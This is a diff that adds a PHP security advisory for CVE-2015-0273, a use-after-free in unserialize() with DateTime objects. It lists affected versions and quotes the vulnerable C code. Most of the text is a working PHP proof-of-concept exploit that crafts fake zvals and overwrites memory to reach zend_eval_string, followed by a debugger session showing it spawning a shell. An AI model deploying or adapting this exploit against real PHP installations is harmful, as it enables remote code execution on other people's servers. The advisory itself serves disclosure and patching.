@@ -1,0 +1,137 @@
+Use After Free Vulnerability in unserialize() with DateTime* [CVE-2015-0273]
+
+Taoguang Chen <[@chtg](http://github.com/chtg)> - Write Date:
+2015.1.29 - Release Date: 2015.2.20
+
+A use-after-free vulnerability was discovered in unserialize() with DateTime/DateTimeZone/DateInterval/DatePeriod objects's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.
+
+Affected Versions
+------------
+Affected is PHP 5.6 < 5.6.6
+Affected is PHP 5.5 < 5.5.22
+Affected is PHP 5.4 < 5.4.38
+
+Credits
+------------
+This vulnerability was disclosed by Taoguang Chen.
+
+Description
+------------
+
+static int php_date_initialize_from_hash(php_date_obj **dateobj,
+HashTable *myht)
+{
+	zval             *z_date;
+	zval             *z_timezone;
+	zval             *z_timezone_type;
+	zval              tmp_obj;
+	timelib_tzinfo   *tzi;
+	php_timezone_obj *tzobj;
+
+	z_date = zend_hash_str_find(myht, "date", sizeof("data")-1);
+	if (z_date) {
+		convert_to_string(z_date);
+		z_timezone_type = zend_hash_str_find(myht, "timezone_type",
+sizeof("timezone_type")-1);
+		if (z_timezone_type) {
+			convert_to_long(z_timezone_type);
+			z_timezone = zend_hash_str_find(myht, "timezone", sizeof("timezone")-1);
+			if (z_timezone) {
+				convert_to_string(z_timezone);
+
+...
+
+static int php_date_timezone_initialize_from_hash(zval **return_value,
+php_timezone_obj **tzobj, HashTable *myht TSRMLS_DC)
+{
+	zval            **z_timezone = NULL;
+	zval            **z_timezone_type = NULL;
+
+	if (zend_hash_find(myht, "timezone_type", 14, (void**)
+&z_timezone_type) == SUCCESS) {
+		if (zend_hash_find(myht, "timezone", 9, (void**) &z_timezone) == SUCCESS) {
+			convert_to_long(*z_timezone_type);
+			if (SUCCESS == timezone_initialize(*tzobj, Z_STRVAL_PP(z_timezone)
+TSRMLS_CC)) {
+				return SUCCESS;
+			}
+		}
+	}
+	return FAILURE;
+}
+
+The convert_to_long() leads to the ZVAL and all its children is freed
+from memory. However the unserialize() code will still allow to use R:
+or r: to set references to that already freed memory. There is a use
+after free vulnerability, and allows to execute arbitrary code.
+
+Proof of Concept Exploit
+------------
+The PoC works on standard MacOSX 10.10.2 installation of PHP 5.5.14.
+
+<?php
+
+$f = $argv[1];
+$c = $argv[2];
+
+$fakezval1 = ptr2str(0x100b83008);
+$fakezval1 .= ptr2str(0x8);
+$fakezval1 .= "\x00\x00\x00\x00";
+$fakezval1 .= "\x06";
+$fakezval1 .= "\x00";
+$fakezval1 .= "\x00\x00";
+
+$data1 = 'a:3:{i:0;O:12:"DateTimeZone":2:{s:13:"timezone_type";a:1:{i:0;i:1;}s:8:"timezone";s:3:"UTC";}i:1;s:'.strlen($fakezval1).':"'.$fakezval1.'";i:2;a:1:{i:0;R:4;}}';
+
+$x = unserialize($data1);
+$y = $x[2];
+
+// zend_eval_string()'s address
+$y[0][0] = "\x6d";
+$y[0][1] = "\x1e";
+$y[0][2] = "\x35";
+$y[0][3] = "\x00";
+$y[0][4] = "\x01";
+$y[0][5] = "\x00";
+$y[0][6] = "\x00";
+$y[0][7] = "\x00";
+
+$fakezval2 = ptr2str(0x3b296324286624); // $f($c);
+$fakezval2 .= ptr2str(0x100b83000);
+$fakezval2 .= "\x00\x00\x00\x00";
+$fakezval2 .= "\x05";
+$fakezval2 .= "\x00";
+$fakezval2 .= "\x00\x00";
+
+$data2 = 'a:3:{i:0;O:12:"DateTimeZone":2:{s:13:"timezone_type";a:1:{i:0;i:1;}s:8:"timezone";s:3:"UTC";}i:1;s:'.strlen($fakezval2).':"'.$fakezval2.'";i:2;O:12:"DateTimeZone":2:{s:13:"timezone_type";a:1:{i:0;R:4;}s:8:"timezone";s:3:"UTC";}}';
+
+$z = unserialize($data2);
+
+function ptr2str($ptr)
+{
+	$out = "";
+	for ($i=0; $i<8; $i++) {
+		$out .= chr($ptr & 0xff);
+		$ptr >>= 8;
+	}
+	return $out;
+}
+
+?>
+
+Test the PoC on the command line, then any PHP code can be executed:
+
+$ lldb php
+(lldb) target create "php"
+Current executable set to 'php' (x86_64).
+(lldb) run uafpoc.php assert "system\('sh'\)==exit\(\)"
+Process 13472 launched: '/usr/bin/php' (x86_64)
+sh: no job control in this shell
+sh-3.2$ php -v
+PHP 5.5.14 (cli) (built: Sep  9 2014 19:09:25)
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+sh-3.2$ exit
+exit
+Process 13472 exited with status = 0 (0x00000000)
+(lldb)
